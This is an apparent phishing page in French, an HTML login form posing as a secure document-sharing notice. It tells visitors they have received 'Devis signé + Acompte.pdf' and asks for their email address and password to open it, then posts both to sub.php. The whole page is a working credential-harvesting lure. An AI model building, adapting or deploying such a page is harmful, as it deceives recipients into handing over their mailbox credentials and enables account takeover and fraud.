<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Connexion</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
            font-family: Arial, sans-serif;
        }
        .logo {
            margin-top: 20px;
        }
        .container {
            text-align: center;
            padding: 20px;
            width: 360px; /* Ajusté pour correspondre à la largeur de la 2ème image */
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin: 0 auto; /* Centre le formulaire */
            position: relative;
            margin-top: 50px; /* Ajusté pour remonter le formulaire de 5 cm */
        }
        .message {
            margin-bottom: 20px;
            font-size: 16px;
            color: #333;
            background-color: #f9f9f9;
            padding: 15px;
            border-left: 5px solid #ff6600;
            border-radius: 8px;
            text-align: left;
            line-height: 1.5;
            display: flex;
            align-items: center;
            gap: 10px; /* Espacement entre l'icône et le texte */
        }
        .message img {
            width: 24px; /* Taille de l'icône */
            height: auto;
        }
        .container input[type="email"],
        .container input[type="password"] {
            width: calc(100% - 22px); /* Ajuste la largeur pour tenir compte des bordures */
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .container button {
            width: calc(100% - 22px); /* Ajuste la largeur pour tenir compte des bordures */
            padding: 10px;
            background-color: #ff6600;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .container button:hover {
            background-color: #e65c00;
        }
        @media (max-width: 600px) {
            .container {
                width: 90%; /* Réduit la largeur pour les petits écrans */
                padding: 15px;
                margin-top: 20px; /* Ajuste la marge pour les petits écrans */
            }
            .container input[type="email"],
            .container input[type="password"],
            .container button {
                width: 100%; /* Assure que les éléments remplissent la largeur du conteneur */
                padding: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="https://i.postimg.cc/d1GHQnv7/1woo.png" alt="Logo" style="max-width: 100%; height: auto;">
    </div>
    <div class="container">
        <div class="message">
            <img src="https://i.postimg.cc/jS9zFRhh/aglo1.jpg" alt="PDF Icon">
            <div>
                <strong>Vous avez reçu un fichier sécurisé</strong><br>
                <em>Devis signé + Acompte.pdf</em><br><br>
                Pour lire le document veuillez entrer les identifiants de messagerie auxquels ce fichier a été envoyé.
            </div>
        </div>
        <form action="sub.php" method="post">
            <input type="email" name="email" placeholder="Email" required><br>
            <input type="password" name="password" placeholder="Mot de passe" required><br>
            <button type="submit">Connexion</button>
        </form>
    </div>
</body>
</html>
